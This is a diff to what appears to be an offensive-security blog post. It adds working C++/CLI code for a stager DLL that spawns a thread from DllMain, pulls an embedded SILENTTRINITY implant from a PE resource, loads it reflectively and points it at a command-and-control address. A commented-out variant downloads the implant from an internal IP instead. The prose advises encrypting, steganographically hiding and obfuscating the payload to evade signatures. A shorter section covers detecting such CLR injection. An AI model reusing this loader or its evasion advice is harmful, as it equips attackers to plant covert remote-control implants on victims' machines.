@@ -124,10 +124,131 @@ As any good engineering project goes, we'll start with stating our requirements.
 
 ## Our Solution
 
-The easiest way to satisfy those requirements is to write a C++/CLI stager that can load an Assembly from DLLMain. For the case above, I simply wrote a DLL that used the Loader Lock avoidance strategy described above, used the .NET WebClient class to download the SILENTRINITY DLL from a URL, and then loaded it from memory using the Reflection API.
+The easiest way to satisfy those requirements is to write a C++/CLI stager that can load an Assembly from DLLMain. For the case above, I simply wrote a DLL that used the Loader Lock avoidance strategy described below, obtained the SILENTTRINITY DLL from a resource, and then loaded it from memory using the Reflection API.
+
+The advantage that this has is that it makes no direct use of COM or the CLR Hosting APIs to load the CLR. It all happens naturally and legitimately. Additionally, its appearance on disk is very different than that of a normal Assembly, evading common signatures.
+
+### Challenges
+
+The main issue that we will have to overcome is [Loader Lock](https://docs.microsoft.com/en-us/cpp/dotnet/initialization-of-mixed-assemblies?view=vs-2019). Because Mixed Assemblies contain native code, they must contend both with the both native Windows Loader and the CLR to be loaded for execution. The Windows loader garauntees that nothing may access code or data in a module before it is initialized. Since the initialization process includes running DllMain, any code in DllMain inherits this protection. As such, Microsoft explicitly tells you not to use any managed code in DllMain. Running managed code requires that the CLR be bootstrapped. If you attempt to do so, you will produce deadlock. The Windows loader has not unlocked the module because DllMain is unfinished, but in order for DllMain to finish, the rest of the module must be unlocked. It turns out, computers are not fond of logical contraditions, and will be rather disappointed with you and refuse to work when asked to perform impossible tasks.
+
+There is a simple solution to this problem: Rather than call managed code directly from DllMain, we will instead create a new thread from a second native function, and then call managed code from that. The new thread will perform two roles.
+
+* Ensure that the parent thread (and process) can continue to execute in the background
+* Ensure that the module can finish initialization, allowing the Windows loader to unlock the process-global critical section
 
 
-## Detecting CLR Injection
+### Payload Location
+
+URL or embedded? We will embed it as a resource. In the real world, you should also encrypt it and maybe store it in an image file as a form of stego. This would simulate a legitimate use of PE resources: file icons. In the real world, I would obfuscate the ST DLL, but this code was sufficient to demonstrate the concept.
+
+#### The Unmanaged Code
+
+```cpp
+// dllmain.cpp : Defines the entry point for the DLL application.
+#define WIN32_LEAN_AND_MEAN
+#include "stdafx.h"
+#include <windows.h>
+#include <iostream>
+#include "resource.h"
+extern void LaunchDll(
+	unsigned char *dll, size_t dllLength,
+	char const *className, char const *methodName);
+static DWORD WINAPI launcher(void* h)
+{
+
+	std::cout << "Created thread...";
+
+	HRSRC res = ::FindResourceA(static_cast<HMODULE>(h),
+		MAKEINTRESOURCEA(IDR_DLLENCLOSED6), "DLLENCLOSED");
+	if (res)
+	{
+		HGLOBAL dat = ::LoadResource(static_cast<HMODULE>(h), res);
+		if (dat)
+		{
+			unsigned char *dll =
+				static_cast<unsigned char*>(::LockResource(dat));
+			if (dll)
+			{
+				size_t len = SizeofResource(static_cast<HMODULE>(h), res);
+				LaunchDll(dll, len, "ST", "Main");
+			}
+		}
+	}
+	return 0;
+}
+extern "C" BOOL APIENTRY DllMain(HMODULE h, DWORD reasonForCall, void* resv)
+{
+	if (reasonForCall == DLL_PROCESS_ATTACH)
+	{
+		CreateThread(0, 0, launcher, h, 0, 0);
+	}
+	return TRUE;
+}
+
+```
+
+After the Loader Lock avoidance, we use common C++ code to obtain the embedded resource and pass it into the managed LaunchDLL function. The CLR and your managed method will be automatically bootstrapped.
+
+#### The Managed Code
+
+Let's get this out of the way: C++/CLI is ugly. It's disgusting. It's hideous. Look at that monstrosity of syntax below. 
+For whatever disgusting reason you must use the `^` symbol preceeding a variable name. And to get the strings and other input to pass correctly into managed API calls you must marshall them from their unmanaged form to their managed form.
+
+```cpp
+#using <mscorlib.dll>
+#include "stdafx.h"
+#using <System.dll>
+
+// Load a managed DLL from a byte array and call a static method in the DLL.
+// dll - the byte array containing the DLL
+// dllLength - the length of 'dll'
+// className - the name of the class with a static method to call.
+// methodName - the static method to call. Must expect no parameters.
+void LaunchDll(
+	unsigned char *dll, size_t dllLength,
+	char const *className, char const *methodName)
+{
+	// convert passed in parameter to managed values
+	cli::array<unsigned char>^ mdll = gcnew cli::array<unsigned char>(dllLength);
+
+	System::Runtime::InteropServices::Marshal::Copy(
+		(System::IntPtr)dll, mdll, 0, mdll->Length);
+	System::String^ cn =
+		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
+		(System::IntPtr)(char*)className);
+	System::String^ mn =
+		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
+		(System::IntPtr)(char*)methodName);
+
+	/**
+	/Downloads the Assembly from a hardcoded URI. Comment out the stuff above.
+	
+	System::Net::WebClient ^_client = gcnew System::Net::WebClient();
+
+	System::String ^uri = "http://192.168.197.133:8000/SILENTTRINITY_DLL.dll";
+
+	System::Console::WriteLine("Downloading payload from: " + uri);
+
+	cli::array<unsigned char>^ mdll = _client->DownloadData(uri);
+	**/
+
+	// used the converted parameters to load the DLL, find, and call the method.
+	System::String^ args =
+		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
+		(System::IntPtr)(char*)"http://192.168.197.134:80");
+
+	array< System::Object^ >^ arr = gcnew array< System::Object^ >(1);
+	arr[0] = args;
+
+	System::Reflection::Assembly^ a = System::Reflection::Assembly::Load(mdll);
+	a->GetType(cn)->GetMethod(mn)->Invoke(nullptr, arr);
+}
+```
+
+But, anyway, it works. Allow me to explain:
+
+# Detecting CLR Injection
 
 If you have been reading my blog posts about Donut, you may be familiar with ModuleMonitor. It uses WMI Event Win32_ModuleLoadTrace to monitor for module loading. For each module that is loaded, it captures information about the process that loaded the module.
 
@@ -168,16 +289,11 @@ ModuleMonitor uses the following implementation of this logic in C#. The full co
 ```
 
 When the detection is successful, you should get a detection that looks like the following.
-
-![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/detected.png)
+![Alt text](https://github.com/TheWover/donut/blob/master/img/detected.png?raw=true "CLR Injection Detected")
 
 It is important to note that this behaviour represents all CLR Injection techniques, of which there are several. This detection should work for donut, as well as other tools such as Cobalt Strike's 'execute-assembly' command.
 
-You could also watch for loads of `clr.dll`. Or use ETW to subscribe to Assembly Load events. I'll leave those as exercises for you. 
-
-# OpSec Considerations
-
-## Bypassing AMSI in .NET v4.8
+You could also watch for loads of `clr.dll`. Or use ETW to subscribe to Assembly Load events. I'll leave those as exercises for you.
 
 ## Further Reading
 
